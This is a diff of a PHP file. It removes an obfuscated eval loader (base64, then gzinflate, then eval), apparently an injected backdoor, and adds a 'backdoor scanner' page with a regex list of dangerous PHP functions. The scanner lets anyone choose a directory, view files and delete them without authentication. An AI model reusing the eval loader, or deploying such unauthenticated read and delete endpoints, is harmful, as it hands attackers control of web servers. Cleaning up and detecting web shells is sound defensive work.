@@ -1,3 +1,153 @@
 <?php
-$SISTEMIT_COM_ENC = "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";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdDZ29KQ1Fra2MzUnlJRDBnV3lmRHZTY3NKOE9xSnl3bnc2TW5MQ2ZEclNjc0o4TzdKeXdudzZZbkxDZkRzU2NzSjhPaEp5d253N1VuTENmRHF5Y3NKOEsxSjEwN0Nna0pDU1J5Y0d4aklEMWJKMkVuTENkcEp5d25kU2NzSjJVbkxDZHZKeXduWkNjc0ozTW5MQ2RvSnl3bmRpY3NKM1FuTENjZ0oxMDdDZ2tKSUNBa2JtRjJJRDBnYzNSeVgzSmxjR3hoWTJVb0pITjBjaXdrY25Cc1l5d2tibUYyS1RzS0Nna0pDV1YyWVd3b0pHNWhkaWs3");eval(base64_decode($rand));$STOP="Gt5HykOcNpMGx9ziixIwOD42ObEmsT020TmR7WkJJCwdN4hh4zjB0jzEvICFxALEggUrxIZ6k3mS+b+/qrqrmgbbmZncTFf/9d/v5OWL7PrLF2ImemIoHsS0M58UxFhM6fPsbj5J1n0xErMW/dPfmE/q9KLXEsP5pCNGTXqY4EWKEAzFQAwJtjCf1MSsfiP69BbYxLhO";
+/*
+author :sohay (cleaned, count removed)
+title: backdoor scanner v1.0.0 (cleaned)
+*/
+echo '<style>body {background-color:#000;color:red;} body,td,th { font: 9pt Courier New;margin:0;vertical-align:top; } span,h1,a { color:#00ff00} span { font-weight: bolder; } h1 { border:1px solid #00ff00;padding: 2px 5px;font: 14pt Courier New;margin:0px; } div.content { padding: 5px;margin-left:5px;} a { text-decoration:none; } a:hover { background:#ff0000; } .ml1 { border:1px solid #444;padding:5px;margin:0;overflow: auto; } .bigarea { width:100%;height:250px; } input, textarea, select { margin:0;color:#00ff00;background-color:#000;border:1px solid #00ff00; font: 9pt Monospace,"Courier New"; } form { margin:0px; } #toolsTbl { text-align:center; } .toolsInp { width: 80%; } .main th {text-align:left;} .main tr:hover{background-color:#5e5e5e;} .main td, th{vertical-align:middle;} pre {font-family:Courier,Monospace;} #cot_tl_fixed{position:fixed;bottom:0px;font-size:12px;left:0px;padding:4px 0;clip:_top:expression(document.documentElement.scrollTop document.documentElement.clientHeight-this.clientHeight);_left:expression(document.documentElement.scrollLeft   document.documentElement.clientWidth - offsetWidth);} .style2 {color: #00FF00} .style3 {color: #009900} .style4 {color: #006600} .style5 {color: #00CC00} .style6 {color: #003300} .style8 {color: #33CC00} #footer { margin-bottom: 10px; color: #666; vertical-align: top; text-align: center; font-size: 11px; } #footer ul { margin: 0; padding: 0; list-style: none; } #footer li { display: inline-block; margin-right: 15px; border-right: 1px solid #666; vertical-align: middle; } #footer li a { margin-right: 15px; } #footer li:last-child { margin-right: 0; border-right: 0; } #footer li:last-child a { margin-right: 0; } #footer a { color: #666; } #footer a:hover { color: #858585; } #footer .footer-left { height: 20px; vertical-align: middle; line-height: 20px; } @media (min-width: 39rem) { #footer { display: flex; flex-flow: row wrap; justify-content: space-between; align-items: center; align-content: center; margin-bottom: 20px; } #footer .footer-left { align-self: flex-start; margin-right: 20px; } #footer .footer-right { align-self: flex-end; } }</style>';
+
+set_time_limit(0);
+error_reporting(0);
+@ini_set('zlib.output_compression', 0);
+@ini_set('implicit_flush', 1);
+for ($i = 0; $i < ob_get_level(); $i++) { @ob_end_flush(); }
+@ob_implicit_flush(true);
+
+$path = getcwd();
+if (isset($_GET['dir']) && is_string($_GET['dir']) && strlen($_GET['dir']) > 0) {
+    $path = $_GET['dir'];
+}
+
+// Self delete
+if (isset($_GET['kill'])) {
+    @unlink(__FILE__);
+}
+
+echo "<a href='?kill'><font color='yellow'>[Self Delete]</font></a><br>";
+echo '<form action="" method="get"><input type="text" name="dir" value="' . htmlspecialchars($path, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . '" style="width: 548px;"> <input type="submit" value="scan"></form><br>';
+echo "CURRENT DIR: <font color='yellow'>" . htmlspecialchars($path, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</font><br>";
+
+if (isset($_GET['delete'])) {
+    $to_delete = $_GET['delete'];
+    if (strpos(realpath($to_delete), realpath($path)) === 0) {
+        @unlink($to_delete);
+        $status = "<font color='red'>FAILED</font>";
+        if (!file_exists($to_delete)) {
+            $status = "<font color='yellow'>Success</font>";
+        }
+        echo "TRY TO DELETE: " . htmlspecialchars($to_delete, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . " $status <br>";
+    } else {
+        echo "<font color='red'>Refused to delete outside scan path.</font><br>";
+    }
+    exit;
+}
+
+scanBackdoor($path);
+
+/* ---------- helpers ---------- */
+
+function save($fname, $value) {
+    @file_put_contents($fname, $value, FILE_APPEND | LOCK_EX);
+}
+
+/**
+ * Strip comments and string literals using PHP tokenizer.
+ */
+function strip_php_comments_and_strings(string $code): string {
+    if (!function_exists('token_get_all')) {
+        $code = preg_replace('/(\'(?:\\\\.|[^\'])*\'|"(?:\\\\.|[^"])*")/s', ' ', $code);
+        $code = preg_replace('#/\*.*?\*/#s', ' ', $code);
+        $code = preg_replace('#//.*?$#m', ' ', $code);
+        return $code;
+    }
+
+    $tokens = token_get_all($code);
+    $out = '';
+    foreach ($tokens as $t) {
+        if (is_array($t)) {
+            $token_id = $t[0];
+            $text = $t[1];
+            if (in_array($token_id, [T_COMMENT, T_DOC_COMMENT, T_CONSTANT_ENCAPSED_STRING, T_ENCAPSED_AND_WHITESPACE], true)) {
+                $out .= str_repeat(' ', strlen($text));
+            } else {
+                $out .= $text;
+            }
+        } else {
+            $out .= $t;
+        }
+    }
+    return $out;
+}
+
+/**
+ * Check a single file for suspicious patterns.
+ * Count removed — only report matches.
+ */
+function checkBackdoor(string $file_location) {
+    global $path;
+
+    $pattern = '#\b(?:eval|assert|preg_replace\s*/e|unserialize|system|exec|shell_exec|passthru|proc_open|popen|pcntl_exec|file_put_contents|move_uploaded_file|base64_decode|gzinflate|gzuncompress|str_rot13|hex2bin|gzdecode)\b#i';
+
+    $contents = @file_get_contents($file_location);
+    if ($contents === false || strlen($contents) === 0) {
+        return;
+    }
+
+    $scan_target = strip_php_comments_and_strings($contents);
+    preg_match_all($pattern, $scan_target, $matches);
+    $raw_matches = $matches[0] ?? [];
+    $found = array_values(array_unique(array_map('trim', array_map('strtolower', $raw_matches))));
+
+    if (empty($found)) {
+        return;
+    }
+
+    // ambil waktu modifikasi file (filemtime), jika gagal tampilkan '-'
+    $mtime = @filemtime($file_location);
+    $date_str = $mtime !== false ? date('Y-m-d H:i:s', $mtime) : '-';
+
+    $safe_file = htmlspecialchars($file_location, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
+    echo "[+] Suspect file -> <a href='?delete=" . urlencode($file_location) . "&dir=" . urlencode($path) . "'><font color='yellow'>[DELETE]</font></a> <font color='white'>{$safe_file}</font> <font color='cyan'>[{$date_str}]</font><br>\n";
+
+    // simpan path + tanggal ke log
+    save("shell-found.txt", $file_location . " | " . $date_str . PHP_EOL);
+
+    $matches_html = [];
+    foreach ($found as $m) {
+        $safe = htmlspecialchars($m, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
+        // bungkus semua match dengan warna putih
+        $matches_html[] = '<span style="color:white">' . $safe . '</span>';
+    }
+
+    echo "<b>Matches:</b> " . implode(', ', $matches_html) . "<br>\n";
+
+    echo '<textarea name="content" cols="100" rows="18">' . htmlspecialchars($contents, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . '</textarea><br><br>';
+}
+
+/**
+ * Recursively scan directory for PHP files and check them.
+ */
+function scanBackdoor(string $current_dir) {
+    if (!is_readable($current_dir)) {
+        return;
+    }
+
+    $items = @scandir($current_dir);
+    if ($items === false) return;
+
+    foreach ($items as $file) {
+        if ($file === '.' || $file === '..') continue;
+        $file_location = $current_dir . DIRECTORY_SEPARATOR . $file;
+        $file_location = str_replace(['//', '\\\\'], DIRECTORY_SEPARATOR, $file_location);
+
+        if (is_dir($file_location)) {
+            scanBackdoor($file_location);
+            continue;
+        }
+
+        $ext = strtolower(pathinfo($file_location, PATHINFO_EXTENSION));
+        if ($ext === 'php' || $ext === 'php5' || $ext === 'phtml') {
+            checkBackdoor($file_location);
+        }
+    }
+}
 ?>
